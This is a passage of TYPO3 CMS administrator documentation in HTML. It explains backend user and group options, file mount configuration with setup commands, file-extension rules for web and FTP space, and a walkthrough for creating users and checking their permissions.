<PRE CLASS="western"><FONT COLOR="#0000cc">admPanel.enable.all</FONT> <FONT COLOR="#000000"><B>=</B></FONT> <FONT COLOR="#cc0000">1</FONT>
<FONT COLOR="#0000cc">setup.default.deleteCmdInClipboard</FONT> <FONT COLOR="#000000"><B>=</B></FONT> <FONT COLOR="#cc0000">1</FONT>
<FONT COLOR="#0000cc">options.shortcutFrame</FONT><FONT COLOR="#000000"><B>=</B></FONT><FONT COLOR="#cc0000">1</FONT></PRE><H3 CLASS="western">
<A NAME="2.4.5.Other options|outline"></A>Other options</H3>
<P CLASS="western">Finally there are a few other options for users
and groups which are not yet mentioned and requires a short note.
Still remember that the Context Sensitive Help available through the
tiny help icons will also provide information for each option!</P>
<H4 CLASS="western">Backend Users</H4>
<P CLASS="western"><IMG SRC="10_html_m7ca41dce.png" NAME="Graphic64" ALIGN=LEFT WIDTH=375 HEIGHT=385 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><BR><BR>
</P>
<UL>
	<LI><P CLASS="western"><B>Default language</B><BR>The backend system
	language selected for the user <I>by default</I>. As soon as the
	user has been logged in once this value will <I>no longer have any
	effect</I> since the value of this field is transferred to the
	internal User Configuration array -&gt;uc of the user object and the
	user will himself be able to change this value from the extension
	&quot;Setup&quot; (User &gt; Setup) if available to him. <BR>Only if
	the contents of the &quot;uc&quot; field in the user record is
	cleared (for example by the Install Tool), then this value will be
	re-inserted as the default language.</P>
	<LI><P CLASS="western"><B>Fileoperation permissions</B><BR>These
	permissions take effect in the <A HREF="#Files:%20t3lib_extFileFunctions%20basics%7Coutline">file
	part of TCE (TYPO3 Core Engine)</A> where management of files and
	folders within the filemounts of a user is controlled.</P>
	<LI><P CLASS="western"><B>General options</B><BR>You can at any time
	disable a user or apply a time interval where the user is allowed to
	be authenticated. Sessions will be ended immediately if the disabled
	flag is set or the start or stop times are exceeded.</P>
</UL>
<UL>
	<LI><P CLASS="western"><B>Lock to domain</B><BR>(Not shown in
	screenshot) Setting this to for example &quot;www.my-domain.com&quot;
	will require a user to be logged in from that domain. Very useful in
	databases with multiple sites/domains since this will prevent users
	from logging in from the domains of other sites in the database. If
	a user logs in from another domain than the one associated with his
	page tree it doesn't give him <I>access</I> to that site though -
	but it surely <I>feels</I> like a security hole although it is not.
	But setting this value you can force the user to be authenticated
	only from a certain URL.</P>
</UL>
<H4 CLASS="western">Backend Groups</H4>
<P CLASS="western"><IMG SRC="10_html_m39ed2be7.png" NAME="Graphic65" ALIGN=LEFT WIDTH=377 HEIGHT=356 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><BR><BR>
</P>
<UL>
	<LI VALUE=1><P CLASS="western"><B>Disable<BR></B>Setting this flag
	will immediately disable the group for all members</P>
	<LI><P CLASS="western"><B>Lock to domain<BR></B>Setting this to for
	example &quot;www.my-domain.com&quot; will require a user to be
	logged in from that domain if membership of this group should be
	gained. Otherwise the group will be ignored for the user.</P>
	<LI><P CLASS="western"><B>Include Access Lists<BR></B>If this
	options is set, the access lists - as discussed earlier - are
	enabled.</P>
	<LI><P CLASS="western"><B>Hide in lists<BR></B>This flag will
	prevent the group from appearing in listings in TYPO3. This includes
	modules like Web&gt;Access and the Task Center (listing groups for
	messages, todos etc.)</P>
	<LI><P CLASS="western"><B>Sub Groups<BR></B>Assigns sub-groups to
	this group. Sub-groups are evaluated before the group including
	them. If a user has membership of a group which includes one or more
	sub-groups then the subgroups will also appear as member groups for
	the user.</P>
	<LI><P CLASS="western"><B>Description<BR></B>Any note you want to
	attach which can help you remember what this group was made for:
	Special role? Special purpose?  Just put in a description.</P>
</UL>
<H3 CLASS="western"><A NAME="2.4.6.More about File Mounts|outline"></A>
More about File Mounts</H3>
<P CLASS="western">File mounts require a little more description of
the concepts provided by TYPO3.</P>
<P CLASS="western">First lets discuss the relative and absolute
filemounts again. In the follow example we use two filemount records
which are created in the root:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m28fed359.png" NAME="Graphic59" ALIGN=LEFT WIDTH=398 HEIGHT=289 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">These have been applied to a user or a member
group for a user.</P>
<H4 CLASS="western">Relative</H4>
<P CLASS="western">Relative filemounts are paths which are mounted
relative to the directory given by
$TYPO3_CONF_VARS['BE']['fileadminDir']. This value is by default set
to &quot;fileadmin/&quot; which is also a directory found on most
TYPO3 installations.</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m296d0994.png" NAME="Graphic57" ALIGN=LEFT WIDTH=395 HEIGHT=272 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">In this example the folder &quot;fileadmin/webfolder/&quot;
is mounted for a user. &quot;fileadmin/webfolder/&quot; is <I>always</I>
relative to the constant PATH_site.</P>
<P CLASS="western">If you want to make this filemount work it
requires - of course - that the path &quot;fileadmin/webfolder/&quot;
is in fact present below the PATH_site. That is not yet the case if
you did the core installation from the introduction chapter of this
document. So the following steps will prepare the directory for use
from scratch (on a UNIX box):</P>
<PRE CLASS="western">[root@T3dev coreinstall]# mkdir fileadmin/
[root@T3dev coreinstall]# mkdir fileadmin/webfolder/
[root@T3dev coreinstall]# chown httpd.httpd fileadmin/ -R</PRE><P CLASS="western">
<BR><BR>
</P>
<P CLASS="western">(&quot;mkdir&quot; means &quot;Make Directory&quot;,
&quot;chown&quot; means &quot;Change Owner&quot;. They are UNIX
commands)</P>
<P CLASS="western">Notice how ownership of the created folders is
changed to &quot;httpd&quot; which is the UNIX-user that Apache on
this particular server executes PHP-scripts as.</P>
<P CLASS="western">If $TYPO3_CONF_VARS['BE']['fileadminDir'] is
false, no relative filemounts are allowed. 
</P>
<P CLASS="western">Remember that &quot;admin&quot; users will have
the $TYPO3_CONF_VARS['BE']['fileadminDir'] path mounted by default -
all other users requires a &quot;Filemount&quot; record to be created
and added to their user record/member groups.</P>
<P CLASS="western">Since relative filemounts are located within the
document root of the website, the URL of the mounted
&quot;fileadmin/webfolder/&quot; would be for example
&quot;http://www.my-typo3-site.org/fileadmin/webfolder/&quot;
provided that &quot;http://www.my-typo3-site.org/&quot; is the domain
of the frontend.</P>
<H4 CLASS="western">Absolute</H4>
<P CLASS="western">The alternative to relative filemounts - which
enables people to upload files into the webspace of the site! - is
absolute filemounts. These can be mounted &quot;internally&quot; on
the server and thus manage files which are not available from a URL.
The requirement for this is that
$TYPO3_CONF_VARS['BE']['lockRootPath'] is set to match the <I>first
part</I> of any absolute path being mounted.</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_31db32db.png" NAME="Graphic58" ALIGN=LEFT WIDTH=427 HEIGHT=288 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">In this case &quot;/my_absolute_path/another_dir/&quot;
is mounted. 
</P>
<P CLASS="western">Before this will work we will have to configure
'lockRootPath'. In typo3conf/localconf.php, enter:</P>
<PRE CLASS="western" STYLE="margin-bottom: 0.5cm"><FONT COLOR="#0000bb">$TYPO3_CONF_VARS</FONT><FONT COLOR="#007700">[</FONT><FONT COLOR="#dd0000">'BE'</FONT><FONT COLOR="#007700">][</FONT><FONT COLOR="#dd0000">'lockRootPath'</FONT><FONT COLOR="#007700">]=</FONT><FONT COLOR="#dd0000">'/my_absolute_path/'</FONT><FONT COLOR="#007700">;</FONT></PRE><P CLASS="western">
Also create the directories:</P>
<PRE CLASS="western">	mkdir /my_absolute_path
	mkdir /my_absolute_path/another_dir/
	chown httpd.httpd /my_absolute_path/ -R</PRE><P CLASS="western">
<BR><BR>
</P>
<P CLASS="western"><B>Safe mode restrictions</B></P>
<P CLASS="western">Notice that safe_mode and other security
restrictions might prevent PHP from working on files outside the
document root and thus prevent absolute filemounts from working! See
the &quot;Installing and Upgrading TYPO3&quot; document for more
details on <A HREF="/home/shafiq/Sites/typo3/doc_inst_upgr/doc/manual.sxw#safe_mode%20and%20open_basedir%7Coutline">how
to run TYPO3 on safe_mode / open_basedir</A> environments.</P>
<H4 CLASS="western">Home directories</H4>
<P CLASS="western">TYPO3 also features the concept of &quot;home
directories&quot;. These are paths that are automatically mounted if
they are present at a path configured in TYPO3_CONF_VARS. Thus they
don't need to have a file mount record representing them - they just
need a properly named directory to be present. Home directories are
nice if you have many users which need individual storage space for
their uploaded files or if you want to supply FTP-access to TYPO3 -
then the safer option is to allow users FTP-access to a non-web area
on the server. Then users can access those files from TYPO3.</P>
<P CLASS="western">The parent directory of user/group home
directories is defined by $TYPO3_CONF_VARS['BE']['userHomePath'] and
$TYPO3_CONF_VARS['BE']['groupHomePath'] respectively. In both cases
the paths <I>must be</I> within the path prefix defined by
$TYPO3_CONF_VARS['BE']['lockRootPath']! Otherwise they will not be
mounted (as with any other absolute path).</P>
<P CLASS="western">Lets configure:</P>
<PRE CLASS="western"><FONT COLOR="#000000"><FONT COLOR="#0000bb">$TYPO3_CONF_VARS</FONT><FONT COLOR="#007700">[</FONT><FONT COLOR="#dd0000">'BE'</FONT><FONT COLOR="#007700">][</FONT><FONT COLOR="#dd0000">'lockRootPath'</FONT><FONT COLOR="#007700">] =</FONT><FONT COLOR="#dd0000">'/my_absolute_path/'</FONT><FONT COLOR="#007700">;</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#0000bb">$TYPO3_CONF_VARS</FONT><FONT COLOR="#007700">[</FONT><FONT COLOR="#dd0000">'BE'</FONT><FONT COLOR="#007700">][</FONT><FONT COLOR="#dd0000">'userHomePath'</FONT><FONT COLOR="#007700">] =</FONT><FONT COLOR="#dd0000">'/my_absolute_path/users/'</FONT><FONT COLOR="#007700">;</FONT></FONT>
<FONT COLOR="#0000bb">$TYPO3_CONF_VARS</FONT><FONT COLOR="#007700">[</FONT><FONT COLOR="#dd0000">'BE'</FONT><FONT COLOR="#007700">][</FONT><FONT COLOR="#dd0000">'groupHomePath'</FONT><FONT COLOR="#007700">]=</FONT><FONT COLOR="#dd0000">'/my_absolute_path/groups/'</FONT><FONT COLOR="#007700">;</FONT></PRE><P CLASS="western">
Lets create:</P>
<PRE CLASS="western">mkdir /my_absolute_path/users/      
mkdir /my_absolute_path/users/2/
mkdir /my_absolute_path/users/1_admin/
mkdir /my_absolute_path/groups        
mkdir /my_absolute_path/groups/1
chown httpd.httpd /my_absolute_path/ -R</PRE><P CLASS="western">
<BR><BR>
</P>
<P CLASS="western">These lines create</P>
<UL>
	<LI><P CLASS="western">The parent directory for user home dirs,
	/my_absolute_path/users</P>
	<LI><P CLASS="western">The parent directory for group home dirs,
	/my_absolute_path/groups</P>
	<LI><P CLASS="western">A <I>home directory</I> for the &quot;be_group&quot;
	with uid=1; /my_absolute_path/groups/1</P>
	<LI><P CLASS="western">A home directory for the &quot;be_user&quot;
	with uid=1/username=&quot;admin&quot;;
	/my_absolute_path/users/1_admin/</P>
	<LI><P CLASS="western">A home directory for the &quot;be_user&quot;
	with uid=2/username=?; /my_absolute_path/users/2/</P>
</UL>
<P CLASS="western">Notice how one user home dir is named &quot;1_admin&quot;
where &quot;1&quot; is the user uid and &quot;admin&quot; is the
username. When user dirs are mounted TYPO3 first looks for a
directory named &quot;[uid]_[username]&quot;, then - if not found -
for a directory named &quot;[uid]&quot;. So the username is optional
and <I>can</I> be a help if you want to identify a users directory
without having to look up his uid. However changing the username will
break the link to the directory of course.</P>
<P CLASS="western">After having created these directories and
configured TYPO3_CONF_VARS to set them up, the folder tree looks like
this for the admin-user of the core_install:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m19e2aa9d.png" NAME="Graphic60" ALIGN=LEFT WIDTH=228 HEIGHT=187 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">Here are some comment to the screenshot:</P>
<OL>
	<LI><P CLASS="western">&quot;fileadmin/&quot; is the
	$TYPO3_CONF_VARS['BE']['fileadminDir'] directory <I><SPAN STYLE="text-decoration: none">mounted
	by default</SPAN></I> for &quot;admin&quot; users!</P>
	<LI><P CLASS="western">This is the users <I>private</I> home
	directory in &quot;/my_absolute_path/users/1_admin/&quot;. Only the
	user &quot;admin&quot; has access to this directory.</P>
	<LI><P CLASS="western">This is the &quot;public&quot; home directory
	that belongs to the group &quot;guest_group&quot; (uid=1). This is
	mounted because the &quot;admin&quot; user has been assigned
	membership of the &quot;guest_group&quot;! Other users with
	membership of this group will have access to this folder as well.</P>
	<LI><P CLASS="western">This is the &quot;Filemount&quot; placeholder
	record defining &quot;fileadmin/webfolder/&quot; as a filemount and
	is mounted because this filemount has been specifically added to the
	users record. (See the section above about relative filemounts)</P>
</OL>
<P CLASS="western">(The two yellow folders named &quot;test&quot; are
some that have been created as a test from the backend.)</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">If we log in as the user &quot;guest&quot; (uid=2)
we should also see some mounted directories:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m4bc68d81.png" NAME="Graphic61" ALIGN=LEFT WIDTH=247 HEIGHT=175 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<OL>
	<LI><P CLASS="western">This is the user &quot;guest&quot;s <I>private</I>
	home directory in &quot;/my_absolute_path/users/2/&quot;. Only the
	user &quot;guest&quot; has access to this directory.</P>
	<LI><P CLASS="western">This is the &quot;public&quot; home directory
	that belongs to the group &quot;guest_group&quot; (uid=1). This is
	mounted because the &quot;guest&quot; user has been assigned
	membership of the &quot;guest_group&quot;! Since the user named
	&quot;admin&quot; has access to this directory as well, they can
	share files here!</P>
	<LI><P CLASS="western">The user &quot;guest&quot; has the Filemount
	&quot;My Abs Path&quot; assigned to him which leads to that path
	being mounted of course (see section on absolute filemounts above).</P>
	<LI><P CLASS="western">The user &quot;guest&quot; has the Filemount
	&quot;My Relative Path&quot; assigned to him which mean it is
	mounted also!</P>
</OL>
<H4 CLASS="western">Webspace/FTPspace</H4>
<P CLASS="western">TYPO3 detects if mounted paths are reaching into
the domain of the PATH_site constant. If that is the case the folder
is recognized as being in the &quot;Web-space&quot; (yellow folder
icon). If a folder is <I>not</I> within PATH_site it is assumed to be
a folder internally on the server and thus in &quot;FTP-space&quot;
(blue folder icon). 
</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m47fd32cf.png" NAME="Graphic62" ALIGN=LEFT WIDTH=195 HEIGHT=96 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">The significance of this is what kinds of files
are allowed the in the one and in the other &quot;space&quot;. This
is determined by the variable
$TYPO3_CONF_VARS['BE']['fileExtensions']:</P>
<PRE CLASS="western"><FONT COLOR="#000000"><FONT COLOR="#0000bb">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#dd0000">'webspace' </FONT><FONT COLOR="#007700">=&gt; array(</FONT><FONT COLOR="#dd0000">'allow'</FONT><FONT COLOR="#007700">=&gt;</FONT><FONT COLOR="#dd0000">''</FONT><FONT COLOR="#007700">, </FONT><FONT COLOR="#dd0000">'deny'</FONT><FONT COLOR="#007700">=&gt;</FONT><FONT COLOR="#dd0000">'php3,php'</FONT><FONT COLOR="#007700">),</FONT></FONT>
<FONT COLOR="#007700">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#dd0000">'ftpspace' </FONT><FONT COLOR="#007700">=&gt; array(</FONT><FONT COLOR="#dd0000">'allow'</FONT><FONT COLOR="#007700">=&gt;</FONT><FONT COLOR="#dd0000">'*'</FONT><FONT COLOR="#007700">, </FONT><FONT COLOR="#dd0000">'deny'</FONT><FONT COLOR="#007700">=&gt;</FONT><FONT COLOR="#dd0000">''</FONT><FONT COLOR="#007700">)</FONT></PRE><P CLASS="western">
This configuration is the default rule on file extensions allowed
within each space. Basically it says that in FTP-space all files are
allowed, but in Web-space &quot;php3&quot; and &quot;php&quot; is
disallowed!</P>
<P CLASS="western">Having restrictions like this also means that
unzipping of files and moving whole directories from FTP- to
Web-space is not possible within the backend of TYPO3. This can be
expressed as these rules:</P>
<UL>
	<LI><P CLASS="western">In web-space you cannot unzip files</P>
	<LI><P CLASS="western">You cannot copy or move folders from ftp- to
	web-space. 
	</P>
</UL>
<P CLASS="western">(see the classes basicfilefunctions,
extfilefunctions and tce_file.php plus the document &quot;TYPO3 Core
API&quot;) 
</P>
<P CLASS="western"><B>Notice:</B> In addition to the rules set up in
$TYPO3_CONF_VARS['BE']['fileExtensions'] there is a global regex
pattern which will also disqualify ANY file matching from being
operated upon. That is set in
$TYPO3_CONF_VARS['BE']['fileDenyPattern'].</P>
<P CLASS="western">For details about the configuration of these
options please read the source comments in
&quot;t3lib/config_default.php&quot;.</P>
<H4 CLASS="western">Filemounts on windows servers</H4>
<P CLASS="western">Currently not know if it works and what
limitations it might have. Probably they have to be on the same
harddisk as the main site.</P>
<H3 CLASS="western"><A NAME="2.4.7.Setting up a new user|outline"></A>
Setting up a new user</H3>
<P CLASS="western">This is a very quick tutorial on setting up a
Backend User. It only outlines the steps you will typically have to
take and it doesn't pretend to explain a lot of alternatives etc. To
properly configure user schemes you must have a detailed
understanding of how access control is done in TYPO3. That is what
you should have gained from reading the previous pages about access
control. But if you need general guidelines, typical setup
suggestions etc, you will have to find a tutorial on the subject.</P>
<H4 CLASS="western">1: Create a new Backend User record</H4>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m194d604b.png" NAME="Graphic66" ALIGN=LEFT WIDTH=389 HEIGHT=156 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<H4 CLASS="western">2: Enter unique username, password, name, email
and language</H4>
<P CLASS="western"><IMG SRC="10_html_m53a9b10f.png" NAME="Graphic67" ALIGN=LEFT WIDTH=435 HEIGHT=355 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><I>Logging in now, this is what the user will see:</I></P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m6fd18e87.png" NAME="Graphic68" ALIGN=LEFT WIDTH=510 HEIGHT=255 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<H4 CLASS="western">3: Create a group, setup access lists, assign
membership of group</H4>
<P CLASS="western">Click the &quot;Create new&quot; icon:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_30a395b7.png" NAME="Graphic69" ALIGN=LEFT WIDTH=445 HEIGHT=253 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">... enable the access lists, and add the relevant
entries:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_75e2e720.png" NAME="Graphic70" ALIGN=LEFT WIDTH=385 HEIGHT=606 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">Edit the user record again and set the membership
of the group:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_6aa5772.png" NAME="Graphic71" ALIGN=LEFT WIDTH=194 HEIGHT=144 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_15ed2447.png" NAME="Graphic72" ALIGN=LEFT WIDTH=435 HEIGHT=90 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><I>Logging in now, this is what the user will see:</I></P>
<P CLASS="western" STYLE="font-style: normal"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_65552a6d.png" NAME="Graphic73" ALIGN=LEFT WIDTH=500 HEIGHT=250 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<H4 CLASS="western">4: Set up DB mount point</H4>
<P CLASS="western">Either do this for the group you created or for
the user record itself. If you chose to set up the DB mount for the
group you will be able to share the DB mount for all members of that
group that has the &quot;Mount from groups:&quot; / &quot;DB Mounts&quot;
flag set.</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m5f9bbf67.png" NAME="Graphic74" ALIGN=LEFT WIDTH=268 HEIGHT=173 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">Then make sure to set the permissions recursively
for that page so either the user owns the page and subsequent pages
or that the user is member of the group owning the pages (or of
course allowing &quot;everybody&quot; access).</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m68dec694.png" NAME="Graphic75" ALIGN=LEFT WIDTH=669 HEIGHT=201 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">Then select the permissions you want to assign. In
this example the user will be the new owner and his member group will
be the group of the pages three levels down. Other configurations can
work as well of course. Most importantly for the DB mount is that the
&quot;Show page&quot; permission is set for the DB mount page.
Otherwise the mount will not even be shown!</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_78e6da0e.png" NAME="Graphic76" ALIGN=LEFT WIDTH=355 HEIGHT=315 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">Result:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m34660d6c.png" NAME="Graphic77" ALIGN=LEFT WIDTH=396 HEIGHT=152 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><I>Logging in now, this is what the user will see
in the Web &gt; List module:</I></P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m5c7c646c.png" NAME="Graphic78" ALIGN=LEFT WIDTH=474 HEIGHT=171 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><BR><BR>
</P>
<H4 CLASS="western">5: Set up a File mount (optional)</H4>
<P CLASS="western">Optionally you can create a file mount for the
user. It's not a requirement since users can upload files directly in
editing forms, but it might be more flexible for your users if they
can create a online archive of files for reuse.</P>
<P CLASS="western">Most typically a user has access to a subfolder in
&quot;fileadmin/&quot;. This can be achieved like this:</P>
<P CLASS="western"><B>Create the Filemount record:</B></P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_5b5ba731.png" NAME="Graphic79" ALIGN=LEFT WIDTH=412 HEIGHT=371 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><B>Create the folder &quot;fileadmin/user_uploads/&quot;:</B></P>
<P CLASS="western">Since you as an &quot;admin&quot; user has access
to &quot;fileadmin/&quot; by default, you can do this easily through
the backend:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m1ba96ae6.png" NAME="Graphic80" ALIGN=LEFT WIDTH=360 HEIGHT=293 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><B>Add the file mount record to the File mounts of
the group &quot;New group&quot;:</B></P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_ce48635.png" NAME="Graphic81" ALIGN=LEFT WIDTH=413 HEIGHT=329 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><B>Make sure the flag &quot;Mount from groups:&quot;
/ &quot;File Mounts&quot; is set:</B></P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_3de13a7a.png" NAME="Graphic82" ALIGN=LEFT WIDTH=436 HEIGHT=236 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><I>Logging in now, this is what the user will see
in the File &gt; List module:</I></P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m21828e7a.png" NAME="Graphic83" ALIGN=LEFT WIDTH=669 HEIGHT=145 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<H3 CLASS="western"><A NAME="2.4.8.Overview of users|outline"></A>Overview
of users</H3>
<P CLASS="western">Since TYPO3 offers such a comprehensive scheme for
controlling permissions it quickly becomes a problem to verify that
all permissions are set correctly. To help alleviate this problem the
extension &quot;beuser&quot; is worth mentioning. 
</P>
<P CLASS="western">This extension installs a backend module in &quot;Tools
&gt; User Admin&quot; (&quot;admin&quot; only access). Here you can
compare the settings for users based on all permission types. For
example the backend users are grouped by membership of backend groups
in this example:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_4a79e056.png" NAME="Graphic84" ALIGN=LEFT WIDTH=373 HEIGHT=350 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">As you can see the users &quot;admin&quot; and
&quot;guest&quot; shares membership of &quot;guest_group&quot; while
the user &quot;newuser&quot; is member of &quot;New group&quot;. 
</P>
<P CLASS="western">Criterias can also be combined:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m6457f0db.png" NAME="Graphic85" ALIGN=LEFT WIDTH=444 HEIGHT=381 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">Viewing the TSconfig structure for users is also
very handy:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m5dbb6d5f.png" NAME="Graphic86" ALIGN=LEFT WIDTH=449 HEIGHT=297 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">Notice how the default TSconfig for &quot;admin&quot;
users clearly is set. Likewise for the &quot;options.shortcutFrame&quot;
setting we applied for the &quot;guest&quot; user earlier while the
newuser has no TSconfig.</P>
<P CLASS="western">Now, lets add the shortcutFrame for the &quot;newuser&quot;
as well:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_ebba7ca.png" NAME="Graphic87" ALIGN=LEFT WIDTH=370 HEIGHT=372 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">As you can see, even if we configure the TSconfig
of the user &quot;newuser&quot; little differently (adding a comment,
using braces) the actually configured values for the &quot;guest&quot;
and &quot;newuser&quot; users is the <I>same</I> now - which
qualifies them to be grouped together when grouping by TSconfig.</P>
<H4 CLASS="western">Switch user</H4>
<P CLASS="western">Apart from edit, disabled and delete buttons
located in the &quot;User Admin&quot; module you can also switch user
easily by a single click if the [SU] button:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m47b077b6.png" NAME="Graphic88" ALIGN=LEFT WIDTH=477 HEIGHT=204 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">You cannot switch back for security reasons, so
you will have to logout and login as &quot;admin&quot; again. However
this feature is extremely practical if you need to login as another
user since you don't have to expose/change their passwords!</P>
<P CLASS="western"><B>Tip:</B> Running MSIE (at least) you can start
MSIE twice from the Program Menu and each instance will have a
different process and &quot;cookie-scope&quot;; The point is that you
can login as &quot;admin&quot; in the one MSIE browser window and as
another user in the other window - in the same database! This is
possible because the two MSIE instances &quot;don't know&quot; about
each other.</P>
<H4 CLASS="western">Previewing user settings</H4>
<P CLASS="western">However you don't have to switch user to just
check how that user would see the backend. You can simply click the
username and you will have a nice view like this:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m2b9da22b.png" NAME="Graphic89" ALIGN=LEFT WIDTH=554 HEIGHT=485 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">This basically lists all information you could
dream of for that user. In particular the calculated permissions for
&quot;This user&quot; (1) is nice since that is the sum of the
user/group/everybody permissions as they will apply to this user for
each page in his DB mounts. 
</P>
<P CLASS="western"><B>&quot;Non-mounted readable pages&quot;</B> (2)
could potentially be a security problem. Those pages are not mounted
as DB mounts and thus not visible/clickable in the page tree. But
guessing an id of one of those pages and sending that id to the
Web&gt;List module would list records on these pages. Most likely you
don't want that. Further the danger is even more serious if you have
Frontend Edit enabled in the CMS frontend. However <I>there is no
problem</I> unless you change a default setting; As long as
TYPO3_CONF_VARS['BE']['lockBeUserToDBmounts'] is true (which it is by
default) pages will be accessible <I>only</I> if the they appear
<I>within</I> the DB mounts - that makes security management a whole
lot easier since you <I>don't</I> have to worry about &quot;Non-mounted
readable pages&quot; at all.</P>
<H2 CLASS="western"><A NAME="2.5.Backend Modules|outline"></A>Backend
Modules</H2>
<P CLASS="western">TYPO3 offers a number of ways to attach custom
functionality to the backend. They fall into these categories:</P>
<H4 CLASS="western">Backend main- and sub-modules</H4>
<P CLASS="western">The backend menu reflects the hierarchy of <I>modules</I>
in TYPO3, divided into <I>Main modules</I> and <I>Sub modules</I>.
This was discussed in the <A HREF="#Backend%20interface%7Coutline">introduction
to the backend interface</A>. Their properties are:</P>
<UL>
	<LI><P CLASS="western"><B>Backend Menu</B><BR>They appear in the
	backend menu and &quot;About modules&quot; screen. They have an
	icon, title, description etc.</P>
	<LI><P CLASS="western"><B>Access control</B><BR>They can be access
	controlled for backend users and groups automatically (depends on
	configuration).</P>
</UL>
<P CLASS="western"><BR><BR>
</P>
